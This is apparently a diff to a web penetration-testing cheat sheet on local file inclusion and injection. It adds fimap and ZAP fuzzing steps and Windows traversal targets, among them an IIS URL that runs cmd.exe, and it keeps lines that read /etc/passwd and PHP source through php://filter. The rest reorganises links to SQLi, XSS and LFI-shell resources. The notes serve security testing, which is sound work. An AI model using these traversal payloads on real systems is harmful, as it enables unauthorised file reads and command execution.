@@ -60,9 +60,27 @@ http://website/?p=file%3a%2f%2f%2fetc%2fpasswd
 %SYSTEMDRIVE%\boot.ini //note only older versions of windows </code>
 {% endhighlight %}
 
+**Test Tool - fimap**
+{% highlight bash %}
+fimap -u 'http://website/?p=file.html'
+{% endhighlight %}
+
+**Using ZAP to Fuzz the URL:**
+1. Right click on request that looks injectable -> fuzz using
+[JHADDIX_LFI](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/lfi/JHADDIX_LFI.txt)
+
+
 **What to go after - Linux:**
 * /etc/passwd
 * [Linux pwnwiki](http://pwnwiki.io/#!presence/linux/blind.md)
+
+**What to go after - Windows:**
+* Old IIS: HTTP://vulnsite/scripts/../../../winnt/system32/CMD.exe+/C+dir (may need to encode the slashes)
+* http://vulnsite/index.php?templ=../include/siteconfig.inc (or just templ=red)
+* /global.asax
+* \docume~1\fprefect\mydocu~1
+* \windows\system32\cmd.exe
+* [Windows pwnwiki](http://pwnwiki.io/#!presence/windows/blind.md)
 
 **File Locations -Debian w/ Apache:**
 * /var/www/html
@@ -75,7 +93,7 @@ http://website/?p=file%3a%2f%2f%2fetc%2fpasswd
 curl -s "http://localhost/ex1.php?page=php://filter/convert.base64-encode/resource=[resource]" | base64 -d
 {% endhighlight %}
 
-Examples:
+Examples:<br>
 /etc/php/7.0/apache2/php.ini
 index.php
 
@@ -283,18 +301,21 @@ Online:
 > **Useful Resources**
 
 * [MongoDB](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
-* [Command Injection](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
-* [Fuzzing List](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
-* [XSS, SQL, LDAP, XPATH, XML Injection Test Strings](https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors)
-* [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
-* [XSS Examples](http://www.xssed.com/)
 * [SQL Injection](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
-* [Informix, MSSQL, Oracle, MySQL, Postgres, DB2, Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/category/cheat-sheet)
+* [websec](https://websec.ca/kb/sql_injection)
+* [PentestMonkey](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
+* [SQLInjection Wiki](http://www.sqlinjectionwiki.com)
 * [Access Injection Cheat Sheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
-[Commix](http://www.kitploit.com/2015/04/commix-automated-all-in-one-os-command.html)
-[LFI Cheat Sheet](https://highon.coffee/blog/lfi-cheat-sheet/)
-[CGI-Bin](https://www.hellboundhackers.org/articles/read-article.php?article_id=7)
+* [Command Injection](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
+* [Fuzzing List](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing)
+* [LFI Cheat Sheet](https://highon.coffee/blog/lfi-cheat-sheet/)
+* [LFI Shell 1](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/)
+* [LFI Shell 2](https://highon.coffee/blog/lfi-cheat-sheet/)
+* [CGI-Bin](https://www.hellboundhackers.org/articles/read-article.php?article_id=7)
+* [XSS, SQL, LDAP, XPATH, XML Injection Test Strings](https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors)
+* [Informix, MSSQL, Oracle, MySQL, Postgres, DB2, Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/category/cheat-sheet)
 
 > **Useful Tools**
 * [SQLMap](http://sqlmap.org)
+* [Commix](http://www.kitploit.com/2015/04/commix-automated-all-in-one-os-command.html)
 
